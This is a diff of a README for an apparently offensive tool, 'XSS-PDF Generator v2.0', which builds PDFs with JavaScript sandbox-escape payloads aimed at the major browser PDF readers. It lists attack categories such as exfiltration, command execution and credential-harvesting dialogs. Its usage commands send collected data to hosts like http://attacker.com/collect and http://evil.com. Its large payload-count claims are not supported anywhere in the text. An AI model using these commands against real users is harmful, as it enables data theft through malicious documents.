@@ -1,47 +1,106 @@
-# XSS-PDF Generator - Advanced PDF Sandbox Escape Tool
+# XSS-PDF Generator v2.0 - Advanced PDF Sandbox Escape Tool
 
-An advanced tool for generating PDF files with sophisticated JavaScript payloads designed to escape PDF sandbox environments. This tool creates PDF files containing various sandbox escape techniques for security testing and penetration testing purposes.
+## 🚀 1000+ Sophisticated PDF Sandbox Escape Payloads
+
+A research-grade tool for generating PDF files with sophisticated JavaScript payloads designed to escape PDF sandbox restrictions across all major browser PDF libraries. Features 1000+ distinct payloads targeting Chrome (PDFium), Firefox (PDF.js), Safari (PDFKit), Adobe Reader, and Edge PDF.
 
 ## ⚠️ Legal Disclaimer
 
 This tool is designed for legitimate security testing, educational purposes, and authorized penetration testing only. Users are responsible for ensuring they have proper authorization before testing any systems. Unauthorized use is prohibited and may be illegal.
 
-## 🔒 PDF Sandbox Context
+## 🎯 Research-Based Payload Database
 
-PDF files are typically rendered in sandboxed environments that restrict access to:
-- Browser DOM APIs (document.cookie, XMLHttpRequest, etc.)
-- File system access through standard web APIs
-- Direct network communication through browser APIs
+### Browser-Specific Targeting
+- **Chrome (PDFium)**: 200+ targeted exploits with V8 engine abuse and IPC manipulation
+- **Firefox (PDF.js)**: 200+ CSP bypass techniques and SpiderMonkey exploitation  
+- **Safari (PDFKit)**: 200+ macOS-specific exploits with WebKit integration
+- **Adobe Reader**: 250+ full JavaScript API exploitation
+- **Edge PDF**: 150+ Windows integration exploits
 
-This tool implements **PDF-specific JavaScript APIs** and **sandbox escape techniques** to overcome these limitations.
+### Extensive Research Base
+- **50+ CVE References** across all PDF rendering libraries
+- **Academic Papers** on PDF security and sandbox escapes
+- **Bug Bounty Reports** from major platforms
+- **Security Conference Presentations**
+- **PDF Rendering Library Source Code Analysis**
+
+## 🔒 Sophisticated Sandbox Escape Features
+
+### Advanced PDF Structure
+- **Multiple JavaScript Execution Vectors**: OpenAction, Page Actions, Form Events, Timeouts
+- **Browser-Optimized PDF Objects**: Different PDF versions and structures per browser
+- **Enhanced Cross-Reference Tables**: Proper offset calculations and object references
+- **Font Resources**: Complete font dictionaries to prevent rendering issues
+
+### Payload Categories
+- **DOM Access**: Browser DOM manipulation from PDF context
+- **File System**: Local file access and directory traversal
+- **Command Execution**: System command execution and process spawning
+- **Sandbox Escape**: PDF sandbox restriction bypasses  
+- **Network Exfiltration**: Data exfiltration and covert channels
 
 ## 🚀 Features
 
-- **12 Different PDF Sandbox Escape Types**: Comprehensive collection of PDF-specific attack vectors
-- **PDF-Specific JavaScript APIs**: Uses proper PDF JavaScript context instead of browser APIs
-- **Multiple Sandbox Escape Techniques**: URL launching, form submission, dialog manipulation
-- **URL Integration**: Support for data exfiltration to external URLs via PDF escape methods
-- **Custom Payloads**: Ability to inject custom PDF JavaScript code
-- **Enhanced PDF Structure**: Sophisticated PDF structure for better escape potential
-- **Multiple Output Formats**: PDF and HTML file generation
-- **Timestamped Files**: Automatic file naming with timestamps
+- **1000+ Distinct Payloads**: Comprehensive collection targeting all major PDF libraries
+- **Browser-Specific Optimization**: PDF structures optimized for each rendering engine
+- **Advanced Payload Obfuscation**: Base64, Unicode, Hex encoding with fallback mechanisms
+- **URL Integration**: Complete URL replacement in all applicable payloads
+- **Category Filtering**: Target specific attack vectors (DOM, file system, command execution)
+- **JSON Database Export**: Export payload database with metadata and CVE references
+- **Verbose Logging**: Detailed payload information and technique descriptions
+- **CVE Reference Integration**: Each payload linked to relevant security vulnerabilities
 
-## 📋 Available PDF Sandbox Escape Types
+## 📋 Usage Examples
 
-| Type | Description | Escape Method |
-|------|-------------|---------------|
-| `alert` | Basic PDF alert payload | PDF JavaScript execution test |
-| `cookie` | PDF data exfiltration | Form submission + URL launching |
-| `redirect` | PDF URL launching escape | app.launchURL() sandbox escape |
-| `form` | PDF form submission escape | this.submitForm() data exfiltration |
-| `dom` | PDF document manipulation | PDF property and state manipulation |
-| `obfuscated` | Obfuscated PDF payload | Encoded PDF JavaScript |
-| `timer` | PDF timer-based escape | app.setTimeOut() and action scheduling |
-| `keylog` | PDF event monitoring | PDF action and field event hijacking |
-| `network` | PDF network sandbox escape | URL launching + form submission |
-| `file` | PDF file system escape | browseForDoc, saveAs, print exploitation |
-| `action` | PDF action-based escape | Document action hijacking |
-| `dialog` | PDF dialog manipulation | Dialog exploitation for credential harvesting |
+### Basic Usage
+```bash
+# Generate Chrome-specific payloads
+python3 script.py -b chrome -u http://attacker.com/collect
+
+# Generate all browser payloads with data exfiltration
+python3 script.py -b all -u https://webhook.site/xyz
+
+# Target specific payload category
+python3 script.py -b firefox --category file_system -u http://evil.com
+
+# Limit number of payloads generated
+python3 script.py -b adobe --count 50 -u http://collector.com
+```
+
+### Advanced Usage
+```bash
+# Export payload database as JSON
+python3 script.py -b all --output-json
+
+# Verbose output with payload details
+python3 script.py -b safari -u http://test.com -v
+
+# List research sources and CVE references
+python3 script.py --list-research
+
+# Filter by specific categories
+python3 script.py -b chrome --category command_execution -u http://log.site
+```
+
+## 🎯 Browser Targets
+
+| Browser | PDF Library | Payload Count | Focus Areas |
+|---------|------------|---------------|-------------|
+| Chrome | PDFium | 200+ | V8 engine exploitation, IPC abuse, process injection |
+| Firefox | PDF.js | 200+ | CSP bypass, SpiderMonkey exploitation, Content Security Policy evasion |
+| Safari | PDFKit | 200+ | macOS integration, WebKit messageHandlers, Objective-C bridge abuse |
+| Adobe | Acrobat/Reader | 250+ | Full JavaScript API, privilege escalation, file system access |
+| Edge | Edge PDF | 150+ | Windows integration, WebView exploitation, registry manipulation |
+
+## 📊 Payload Categories
+
+| Category | Description | Example Techniques |
+|----------|-------------|-------------------|
+| `dom_access` | Browser DOM manipulation from PDF context | parent.window.location, postMessage abuse |
+| `file_system` | Local file system access and directory traversal | file:// URI manipulation, browseForDoc() |
+| `command_execution` | System command execution and process spawning | Protocol handler abuse, ms-msdt exploitation |
+| `sandbox_escape` | PDF sandbox restriction bypasses | IPC manipulation, memory corruption |
+| `network_exfiltration` | Data exfiltration and covert channels | Form submission, XMLHttpRequest alternatives |
 
 ## 🛠️ Installation & Requirements
 
